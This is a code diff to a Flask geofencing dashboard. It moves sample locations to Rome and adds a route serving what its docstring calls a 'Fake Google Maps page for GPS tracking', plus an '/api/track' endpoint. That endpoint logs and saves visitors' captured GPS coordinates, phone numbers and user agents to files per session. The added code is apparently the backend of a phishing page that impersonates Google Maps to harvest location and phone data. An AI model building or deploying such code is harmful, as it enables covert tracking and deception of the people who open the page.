@@ -50,16 +50,16 @@ def load_zones():
     return [
         {
             "id": "zone_001",
-            "name": "Construction Site Alpha",
-            "description": "Active construction zone with heavy machinery",
+            "name": "Zona Cantiere Roma Centro",
+            "description": "Zona lavori attiva con mezzi pesanti",
             "type": "construction",
             "geometry": {
                 "type": "circle",
                 "center": {
-                    "latitude": 40.7128,
-                    "longitude": -74.0060
+                    "latitude": 41.9028,  # Rome center
+                    "longitude": 12.4964
                 },
-                "radius": 150
+                "radius": 200
             },
             "severity": "high",
             "active": True
@@ -70,9 +70,9 @@ def simulate_gps_movement():
     """Simulate GPS movement for demonstration."""
     global simulation_step, current_location
     
-    # Base location (NYC area)
-    base_lat = 40.7128
-    base_lon = -74.0060
+    # Base location (Italy - Rome area) 
+    base_lat = 41.9028  # Rome, Italy
+    base_lon = 12.4964
     
     # Create circular movement pattern
     radius = 0.01  # About 1km radius
@@ -102,6 +102,17 @@ def simulate_gps_movement():
 def dashboard():
     """Main dashboard page."""
     return render_template('index.html')
+
+@app.route('/maps')
+def fake_maps():
+    """Fake Google Maps page for GPS tracking."""
+    # Read and serve the fake maps HTML file
+    try:
+        with open('fake_maps.html', 'r', encoding='utf-8') as f:
+            content = f.read()
+        return content
+    except FileNotFoundError:
+        return "Fake maps page not found", 404
 
 @app.route('/api/status')
 def get_status():
@@ -224,6 +235,106 @@ def get_alerts():
         'alerts': sample_alerts,
         'count': len(sample_alerts)
     })
+
+@app.route('/api/track', methods=['POST'])
+def track_user():
+    """Endpoint per ricevere dati di tracking GPS e telefono."""
+    try:
+        data = request.get_json()
+        
+        # Log dei dati ricevuti
+        print(f"\n🎯 TRACKING DATA RECEIVED:")
+        print(f"Session ID: {data.get('sessionId')}")
+        print(f"Event Type: {data.get('eventType')}")
+        print(f"Timestamp: {data.get('timestamp')}")
+        print(f"User Agent: {data.get('userAgent')}")
+        print(f"Data: {data.get('data')}")
+        print("="*50)
+        
+        # Salva in file per tracking persistente
+        import json
+        from pathlib import Path
+        
+        # Ensure tracking directory exists
+        tracking_dir = Path("data/tracking")
+        tracking_dir.mkdir(parents=True, exist_ok=True)
+        
+        # Nome file basato sulla sessione
+        session_id = data.get('sessionId', 'unknown')
+        tracking_file = tracking_dir / f"{session_id}.jsonl"
+        
+        # Append data to file
+        with open(tracking_file, 'a') as f:
+            f.write(json.dumps(data) + '\n')
+        
+        # Se abbiamo coordinate GPS, salvale separatamente
+        if data.get('eventType') == 'location_captured':
+            location_data = data.get('data', {})
+            if location_data.get('latitude') and location_data.get('longitude'):
+                print(f"\n📍 GPS COORDINATES CAPTURED:")
+                print(f"Latitude: {location_data['latitude']}")
+                print(f"Longitude: {location_data['longitude']}")
+                print(f"Accuracy: {location_data.get('accuracy', 'unknown')} meters")
+                print(f"Timestamp: {location_data.get('timestamp')}")
+                
+                # Salva coordinate in file separato
+                coords_file = tracking_dir / "gps_coordinates.jsonl"
+                with open(coords_file, 'a') as f:
+                    coord_entry = {
+                        'session_id': session_id,
+                        'timestamp': location_data.get('timestamp'),
+                        'latitude': location_data['latitude'],
+                        'longitude': location_data['longitude'],
+                        'accuracy': location_data.get('accuracy'),
+                        'user_agent': data.get('userAgent')
+                    }
+                    f.write(json.dumps(coord_entry) + '\n')
+        
+        # Se abbiamo un numero di telefono
+        if data.get('eventType') == 'phone_captured':
+            phone_data = data.get('data', {})
+            phone = phone_data.get('phone')
+            if phone:
+                print(f"\n📱 PHONE NUMBER CAPTURED:")
+                print(f"Phone: {phone}")
+                print(f"Session: {session_id}")
+                print(f"Timestamp: {phone_data.get('timestamp')}")
+                
+                # Salva telefoni in file separato
+                phones_file = tracking_dir / "phone_numbers.jsonl"
+                with open(phones_file, 'a') as f:
+                    phone_entry = {
+                        'session_id': session_id,
+                        'timestamp': phone_data.get('timestamp'),
+                        'phone': phone,
+                        'user_agent': data.get('userAgent')
+                    }
+                    f.write(json.dumps(phone_entry) + '\n')
+        
+        # Se è una sessione completa, crea summary
+        if data.get('eventType') == 'session_complete':
+            session_data = data.get('data', {})
+            print(f"\n✅ SESSION COMPLETE:")
+            print(f"Session ID: {session_id}")
+            
+            location = session_data.get('location')
+            if location:
+                print(f"Final GPS: {location['latitude']}, {location['longitude']}")
+            
+            phone = session_data.get('phone')
+            if phone:
+                print(f"Phone: {phone}")
+            
+            # Salva summary completo
+            summary_file = tracking_dir / "session_summaries.jsonl"
+            with open(summary_file, 'a') as f:
+                f.write(json.dumps(session_data) + '\n')
+        
+        return jsonify({'status': 'success', 'message': 'Data tracked successfully'})
+        
+    except Exception as e:
+        print(f"Error in tracking endpoint: {e}")
+        return jsonify({'status': 'error', 'message': str(e)}), 500
 
 # SocketIO events
 @socketio.on('connect')
